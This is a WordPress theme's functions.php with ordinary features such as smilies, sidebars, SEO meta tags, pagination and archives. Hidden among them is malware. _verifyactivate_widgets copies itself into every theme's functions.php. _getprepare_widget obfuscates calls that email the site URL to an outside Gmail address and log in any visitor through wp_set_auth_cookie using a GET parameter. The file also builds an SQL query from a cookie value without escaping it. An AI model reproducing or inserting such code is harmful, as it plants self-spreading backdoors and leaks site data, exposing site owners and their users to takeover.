       ':oops:' => 'icon_redface.gif',
       ':razz:' => 'icon_razz.gif',
       ':roll:' => 'icon_rolleyes.gif',
       ':wink:' => 'icon_wink.gif',
        ':cry:' => 'icon_cry.gif',
        ':lol:' => 'icon_lol.gif',
        ':mad:' => 'icon_mad.gif',
        ':sad:' => 'icon_sad.gif',
          '8-)' => 'icon_cool.gif',
          '8-O' => 'icon_eek.gif',
          ':-(' => 'icon_sad.gif',
          ':-)' => 'icon_smile.gif',
          ':-?' => 'icon_confused.gif',
          ':-D' => 'icon_biggrin.gif',
          ':-P' => 'icon_razz.gif',
          ':-o' => 'icon_surprised.gif',
          ':-x' => 'icon_mad.gif',
          ':-|' => 'icon_neutral.gif',
          ';-)' => 'icon_wink.gif',
        // This one transformation breaks regular text with frequency.
        //  '8)' => 'icon_cool.gif',
           '8O' => 'icon_eek.gif',
           ':(' => 'icon_sad.gif',
           ':)' => 'icon_smile.gif',
           ':?' => 'icon_confused.gif',
           ':D' => 'icon_biggrin.gif',
           ':P' => 'icon_razz.gif',
           ':o' => 'icon_surprised.gif',
           ':x' => 'icon_mad.gif',
           ':|' => 'icon_neutral.gif',
           ';)' => 'icon_wink.gif',
          ':!:' => 'icon_exclaim.gif',
          ':?:' => 'icon_question.gif',
    );
}
smilies_reset();

//评论后查看隐藏内容
function reply_to_read($atts, $content=null) {   
        extract(shortcode_atts(array("notice" => '<p class="reply-to-read">温馨提示: 此处内容需要<a href="#respond" title="评论本文">评论本文</a>后才能查看。</p>'), $atts));   
        $email = null;   
        $user_ID = (int) wp_get_current_user()->ID;   
        if ($user_ID > 0) {   
            $email = get_userdata($user_ID)->user_email;     
            $admin_email = "343430258@qq.com"; //博主Email   
            if ($email == $admin_email) {   
                return $content;   
            }   
        } else if (isset($_COOKIE['comment_author_email_' . COOKIEHASH])) {   
            $email = str_replace('%40', '@', $_COOKIE['comment_author_email_' . COOKIEHASH]);   
        } else {   
            return $notice;   
        }   
        if (empty($email)) {   
            return $notice;   
        }   
        global $wpdb;   
        $post_id = get_the_ID();   
        $query = "SELECT `comment_ID` FROM {$wpdb->comments} WHERE `comment_post_ID`={$post_id} and `comment_approved`='1' and `comment_author_email`='{$email}' LIMIT 1";   
        if ($wpdb->get_results($query)) {   
            return do_shortcode($content);   
        } else {   
            return $notice;   
        }   
    }  
add_shortcode('reply', 'reply_to_read');?>
<?php
$theme_name = 'Hawkcms';

add_action( 'after_setup_theme', 'init_setup_theme' );

//include('theme-option.php');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );

function dopt($e){
    return stripslashes(get_option($e));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'name'          => '首页侧栏',
        'id'            => 'widget_homesidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name'          => '文章页侧栏',
        'id'            => 'widget_postsidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
}
function init_setup_theme(){

    //去除头部冗余代码
    remove_action( 'wp_head',   'feed_links_extra', 3 );
    remove_action( 'wp_head',   'rsd_link' );
    remove_action( 'wp_head',   'wlwmanifest_link' );
    remove_action( 'wp_head',   'index_rel_link' );
    remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_shortlink_wp_head', 10, 0 );
    //隐藏admin Bar
	function hide_admin_bar($flag) {
		return false;
	}
	add_filter('show_admin_bar','hide_admin_bar');

    //关键字
    add_action('wp_head','set_meta_keywords');

    //页面描述
    add_action('wp_head','set_meta_description');

    //阻止站内PingBack
    if( dopt('d_pingback_b') != '' ){
        add_action('pre_ping','noself_ping');
    }

    //Gzip压缩
    add_action('init','ux_gzip');

    //文章末尾增加版权
    add_filter('the_content','set_copyright');

    //移除自动保存和修订版本
    if( dopt('d_autosave_b') != '' ){
        add_action('wp_print_scripts','ux_disable_autosave' );
        remove_action('pre_post_update','wp_save_post_revision' );
    }

    //去除自带js
    wp_deregister_script( 'l10n' );

    //修改默认发信地址
    add_filter('wp_mail_from', 'res_from_email');
    add_filter('wp_mail_from_name', 'res_from_name');

    //缩略图设置
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(140, 98, true);

    add_editor_style('editor-style.css');

    //定义菜单
    if (function_exists('register_nav_menus')){
        register_nav_menus( array(
            'nav' => __('导航'),
            'footer' => __('底部链接'),
            'menu' => __('页面菜单')
        ) );
    }

}

// 取消原有jQuery
if ( !is_admin() ) {
    if ( $localhost == 0 ) {
        function my_init_method() {
            wp_deregister_script( 'jquery' );
        }
        add_action('init', 'my_init_method');
    }
}

$dHasShare = false;
function default_avatar_url($mail){
  $p = get_bloginfo('template_directory').'/default.png';
  if($mail=='') return $p;
  preg_match("/src='(.*?)'/i", get_avatar( $mail,'36',$p ), $matches);
  return $matches[1];
}

//评论头像缓存
function set_comment_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
    copy(htmlspecialchars_decode($g), $e);
  else
    $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
    copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}


//关键字
function set_meta_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
    if ( get_the_tags( $post->ID ) ) {
      foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
    }
    foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
    $keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
    echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function set_meta_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
    if( !empty( $post->post_excerpt ) ) {
      $text = $post->post_excerpt;
    } else {
      $text = $post->post_content;
    }
    $description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
    if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = $blog_name . "-" . get_bloginfo('description') . dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
  } elseif ( is_category() ) { $description = $blog_name . "'" . single_cat_title('', false) . "'";
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' ) . '..';
  echo "<meta name=\"description\" content=\"$description\">\n";
}

//阻止站内文章Pingback
function noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function ux_disable_autosave() {
  wp_deregister_script('autosave');
}

//垃圾评论拦截
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $spamcom = isset($_POST['comment'])        ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "$spamcom";
    }
  }

  function sink( $comment ) {
  $email = $comment['comment_author_email'];
  $g = 'http://www.gravatar.com/avatar/'. md5( strtolower( $email ) ). '?d=404';
  $headers = @get_headers( $g );
    if ( !preg_match("|200|", $headers[0]) ) {
      add_filter('pre_comment_approved', create_function('', 'return "0";'));
    }
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      die();
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();

//Gzip压缩
function ux_gzip() {
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}


//修改默认发信地址
function res_from_email($email) {
    $wp_from_email = get_option('admin_email');
    return $wp_from_email;
}
function res_from_name($email){
    $wp_from_name = get_option('blogname');
    return $wp_from_name;
}

//文章（包括feed）末尾加版权说明
function set_copyright($content) {
	  if( !is_page() ){
		
		$content .= wp_link_pages(array('before' => '<div class="fenye">', 'after' => '', 'next_or_number' => 'next', 'previouspagelink' => '上一页', 'nextpagelink' => ""));
		$content .= wp_link_pages(array('before' => '', 'after' => '', 'next_or_number' => 'number', 'link_before' =>'<span>', 'link_after'=>'</span>'));
		$content .= wp_link_pages(array('before' => '', 'after' => '</div>', 'next_or_number' => 'next', 'previouspagelink' => '', 'nextpagelink' => "下一页"));

       $content.= '<p>转载注明:<a href="'.get_permalink().'">'.'('.get_permalink().')</a></p>';
    }
    if( is_feed() ){
        $content.= rss_postrelated();
    }
    return $content;
}

function rss_postrelated(){
    $exclude_id = $post->ID;
    $posttags = get_the_tags();
    $i = 0;
    $limit = 6 ;
    if ( $posttags ) {
      $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
      $args = array(
        'post_status' => 'publish',
        'tag_slug__in' => explode(',', $tags),
        'post__not_in' => explode(',', $exclude_id),
        'caller_get_posts' => 1,
        'orderby' => 'comment_date',
        'posts_per_page' => $limit
      );
      query_posts($args);
      while( have_posts() ) { the_post();
        $output .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
        $exclude_id .= ',' . $post->ID; $i ++;
      };
      return '<h4 style="font-size:14px;margin:10px 0;border-bottom:solid 1px #ddd;">继续阅读相关文章：</h4><ul style="line-height:20px;">'.$output.'</ul>';
      wp_reset_query();
    }
}

function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

add_filter('widget_tag_cloud_args','style_tags');  //修改标签云样式
//修改标签云样式
function style_tags($args) {
$args = array(
  'largest'=> '8',
  'smallest'=> '8',
  'format'=> 'flat',
  'number' => '21',
  'orderby' => 'count',
  'order' => 'DESC'
);
return $args;
}
// 文章添加关键词链接
//连接数量
$match_num_from = 1;  //一篇文章中同一个关键字少于多少不秒文本（这个直接填1就好了）
$match_num_to = 1; //一篇文章中同一个关键字最多出现多少次描文本（建议不超过2次）
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//改变标签关键字
function tag_link($content){
	global $match_num_from,$match_num_to;
	$posttags = get_the_tags();
	if ($posttags) {
		usort($posttags, "tag_sort");
		foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<span class=\"tag-span\"><a class=\"tag\" href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a></span>";
			$limit = rand($match_num_from,$match_num_to);

			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);

			$cleankeyword = preg_quote($cleankeyword,'\'');

			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;

			$content = preg_replace($regEx,$url,$content,$limit);

			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);

		}
	}
	return $content;
}
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}

//分页函数
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a></li>";}
	echo '<li>';previous_posts_link('上一页');echo "</li>";
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a></li>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}

	echo '<li>';next_posts_link(' 下一页 ');echo "</li>";
    if($paged != $max_page){echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a></li>";}}
}


//文章归档
function archives_list_SHe() {
	global $wpdb,$month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_'.$lastpost);
	if(empty($output)){
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
			$thismonth    = zeroise($monthresult->month, 2);
			$thisyear    = $monthresult->year;
			$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
			$postresults = $wpdb->get_results($q);
			if ($postresults) {
				$text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
				$postcount = count($postresults);
				$output .= '<dl><dt><strong>' . $text . '</strong> &nbsp;(' . count($postresults) . '&nbsp;' . __('篇文章','freephp') . ')</dt>' . "\n";
			foreach ($postresults as $postresult) {
				if ($postresult->post_date != '0000-00-00 00:00:00') {
				$url = get_permalink($postresult->ID);
				$arc_title    = $postresult->post_title;
				if ($arc_title)
					$text = wptexturize(strip_tags($arc_title));
				else
					$text = $postresult->ID;
					$title_text = __('View this post','freephp') . ', &quot;' . wp_specialchars($text, 1) . '&quot;';
					$output .= '<dd>' . mysql2date('m-d', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
					$output .= '&nbsp;(' . $postresult->comment_count . ')';
					$output .= '</dd>' . "\n";
				}
				}
			}
			$output .= '</dl>' . "\n";
			}
        update_option('SHe_archives_'.$lastpost,$output);
		}else{
			$output = '<div class="errorbox">'. __('Sorry, no posts matched your criteria.','freephp') .'</div>' . "\n";
		}
	}
	echo $output;
}
?>
